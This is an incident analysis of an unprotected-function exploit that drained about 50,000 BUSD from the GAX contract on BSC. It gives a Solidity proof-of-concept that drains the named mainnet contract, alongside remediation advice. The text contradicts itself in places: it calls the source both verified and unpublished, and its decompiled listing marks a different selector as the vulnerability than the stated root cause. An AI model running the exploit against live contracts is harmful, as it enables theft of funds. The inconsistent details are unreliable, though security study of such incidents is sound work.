# GAX — Analysis of BUSD Theft via Unvalidated Low-Level Call

| Field | Details |
|------|------|
| **Date** | 2024-07-13 |
| **Protocol** | GAX |
| **Chain** | BSC |
| **Loss** | ~50,000 BUSD |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed |
| **Vulnerable Contract** | [0xdb4b73Df2F6dE4AFCd3A883efE8b7a4B0763822b](https://bscscan.com/address/0xdb4b73Df2F6dE4AFCd3A883efE8b7a4B0763822b) |
| **Root Cause** | Unvalidated low-level call via function selector 0x6c99d7c8 |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/GAX_exp.sol) |

---

## 1. Vulnerability Overview

The GAX vulnerable contract (`0xdb4b73Df`) accepted arbitrarily encoded external data via function selector `0x6c99d7c8` and executed it without any validation. The attacker called this function with the contract's BUSD balance encoded as a parameter, draining approximately 50,000 BUSD.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: selector 0x6c99d7c8 — processes encoded data without validation
function execute(bytes calldata encodedData) external {
    // Decodes address and amount from encodedData without validation
    (address token, address recipient, uint256 amount) = abi.decode(
        encodedData, (address, address, uint256)
    );
    IERC20(token).transfer(recipient, amount);  // ❌ No caller validation
}

// ✅ Correct code: restrict execution to admin only via access control
function execute(bytes calldata encodedData) external onlyOwner {  // ✅ Access control
    (address token, address recipient, uint256 amount) = abi.decode(
        encodedData, (address, address, uint256)
    );
    require(amount <= withdrawLimit, "Exceeds limit");  // ✅ Amount limit
    IERC20(token).transfer(recipient, amount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: GAX_decompiled.sol
contract GAX {
contract GAX {
    address public owner;


    // Selector: 0x74e6aa6f
    function unknown_74e6aa6f() external {}  // ❌ Vulnerability

    // Selector: 0xadfe9aef
    function unknown_adfe9aef() external {}

    // Selector: 0xd84e4f5a
    function bnbBalance(address p0) external {}

    // Selector: 0xf2fde38b
    // Alternative: _SIMONdotBLACK_(int8[],uint256,address,bytes8,int96)
    function transferOwnership(address p0) external {}

    // Selector: 0xf7260d3e
    function receiver() external {}

    // Selector: 0xfcbb727d
    function unknown_fcbb727d() external {}

    // Selector: 0xc176ecf9
    function unknown_c176ecf9() external {}

    // Selector: 0xc54e44eb
    function USDT() external {}

    // Selector: 0xc5d7eee8
    function unknown_c5d7eee8() external {}

    // Selector: 0x9c43af78
    function unknown_9c43af78() external {}

    // Selector: 0xa23bf6dc
    function unknown_a23bf6dc() external {}

    // Selector: 0xa54eeba6
    function unknown_a54eeba6() external {}

    // Selector: 0xab6b6e41
    function unknown_ab6b6e41() external {}

    // Selector: 0x87b09ba6
    // 📌 Staking — lock period validation required
    function stakeUSDT(uint256 p0) external {}

    // Selector: 0x8da5cb5b
    function owner() external view returns (address) {}

    // Selector: 0x573a8bb9
    function unknown_573a8bb9() external {}

    // Selector: 0x65fbb50f
    function unknown_65fbb50f() external {}

    // Selector: 0x6aa90ab8
    function unknown_6aa90ab8() external {}

    // Selector: 0x6c99d7c8
    function unknown_6c99d7c8() external {}

    // Selector: 0x718da7ee
    function setReceiver(address p0) external {}

    // Selector: 0x5cc451f1
    function unknown_5cc451f1() external {}

    // Selector: 0x6360ab01
    function unknown_6360ab01() external {}

    // Selector: 0x1af979ad
    function unknown_1af979ad() external {}

    // Selector: 0x28ad4168
    function unknown_28ad4168() external {}

    // Selector: 0x2d98728d
    function unknown_2d98728d() external {}

    // Selector: 0x4828ae67
    function unknown_4828ae67() external {}

    // Selector: 0x01e33667
    // 📌 Withdrawal — reserve validation required
    function withdrawToken(address p0, address p1, uint256 p2) external {}

    // Selector: 0x0a75bf14
    function unknown_0a75bf14() external {}

    // Selector: 0x1252b9b7
    function unknown_1252b9b7() external {}

    // Selector: 0x70a08231
    function balanceOf(address p0) external view returns (uint256) {}

    // Selector: 0xdd62ed3e
    function allowance(address p0, address p1) external view returns (uint256) {}

    // Selector: 0xa9059cbb
    function transfer(address p0, uint256 p1) external {}

    // Selector: 0x23b872dd
    // 📌 Arbitrary transferFrom — approval validation required
    function transferFrom(address p0, address p1, uint256 p2) external {}

    // Selector: 0x774297ee
    function unknown_774297ee() external {}
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Query BUSD balance of GAX vulnerable contract (0xdb4b73)
  │         └─► BUSD.balanceOf(0xdb4b73Df) = ~50,000 BUSD
  │
  ├─[2]─► Call function via selector 0x6c99d7c8
  │         └─► encodedData = abi.encode(BUSD, attacker, 50000e18)
  │
  ├─[3]─► Contract executes BUSD.transfer(attacker, 50000e18) without validation
  │
  └─[4]─► Total loss: ~50,000 BUSD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address constant GAX_VULN = 0xdb4b73Df2F6dE4AFCd3A883efE8b7a4B0763822b;

    function testExploit() external {
        // [1] Check BUSD balance held by the vulnerable contract
        uint256 balance = BUSD.balanceOf(GAX_VULN);

        // [2] Low-level call via selector 0x6c99d7c8
        // encodedData: BUSD contract, recipient (attacker), amount
        bytes memory encodedData = abi.encode(
            address(BUSD),
            address(this),  // attacker address
            balance
        );
        GAX_VULN.call(
            abi.encodeWithSelector(bytes4(0x6c99d7c8), encodedData)
        );

        // [3] Full BUSD balance drained
        emit log_named_decimal_uint("Stolen BUSD", BUSD.balanceOf(address(this)), 18);
    }

    fallback() external payable {}
    receive() external payable {}
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Access Control |
| **Attack Technique** | Unvalidated Low-level Call with Encoded Parameters |
| **DASP Category** | Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Severity** | Critical |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **Add Access Control**: Protect sensitive execution functions with an `onlyOwner` or `onlyAdmin` modifier.
2. **Input Validation**: Verify that the recipient address is on an allowlist and that the amount is within permitted limits.
3. **Set Withdrawal Limits**: Cap the maximum amount withdrawable in a single transaction.
4. **Emit Events**: Emit events on token transfers to enable monitoring.

## 7. Lessons Learned

- **Danger of Low-Level Calls**: Functions that execute unvalidated encoded data directly are extremely dangerous.
- **Simplicity of Balance Queries**: Since attackers can easily query balances on-chain, contracts that hold funds must have proper access control in place.
- **Unverified Contract**: The GAX contract's source code was not publicly available; however, the vulnerability was still analyzable via function selectors.